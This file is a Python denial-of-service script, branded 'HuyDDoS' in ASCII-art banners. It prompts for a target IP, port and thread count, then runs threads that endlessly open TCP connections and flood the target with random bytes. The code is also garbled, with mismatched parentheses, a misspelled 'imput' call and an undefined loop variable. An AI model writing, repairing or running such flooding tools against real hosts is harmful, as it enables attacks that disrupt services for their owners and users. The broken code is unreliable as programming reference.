import random
import threading
import socket
import os
import time
os.system('cls')
print(r"""
██╗░░██╗██╗░░░██╗██╗░░░██╗██████╗░██████╗░░█████╗░░██████╗
██║░░██║██║░░░██║╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
███████║██║░░░██║░╚████╔╝░██║░░██║██║░░██║██║░░██║╚█████╗░
██╔══██║██║░░░██║░░╚██╔╝░░██║░░██║██║░░██║██║░░██║░╚═══██╗
██║░░██║╚██████╔╝░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
                                                Created By HuyXingum""", 'red'))
print("\n########################################################################\n",))
ip = str(input("[+] IP: ",)))
port = int(input("[+] Port: ",)))
packet = int(imput("[+] Threads: ",)))
time.sleep(1.5)
os.system('cls')
print(r"""
░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░██╔╝
███████║░░░██║░░░░░░██║░░░███████║██║░░╚═╝█████═╝░
██╔══██║░░░██║░░░░░░██║░░░██╔══██║██║░░██╗██╔═██╗░
██║░░██║░░░██║░░░░░░██║░░░██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝ """,))
print("\n########################################################################", 'red'))
time.sleep(2)
print("\n[+] Start...",))
time.sleep(1)
print("\n3",))
time.sleep(1)
print("\n2",))
time.sleep(1)
print("\n1",))
os.system('cls')
def syn():

    hevin = random._urandom(900)
    bb = int(0)
    while True:
        try:
            h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            h.connect((ip,port))
            h.send(hevin)
            for i in range(packet):
                h.send(hevin)
            bb += 1
            print('[+] Attaking '+ip + '>>>Sent: '+str(bb), 'red'))
        except KeyboardInterrupt:
            h.close()
            print("[+++] DONE !!!",))
            pass
for b in range(thread):
    thread = threading.Thread(target=syn)
    thread.start()
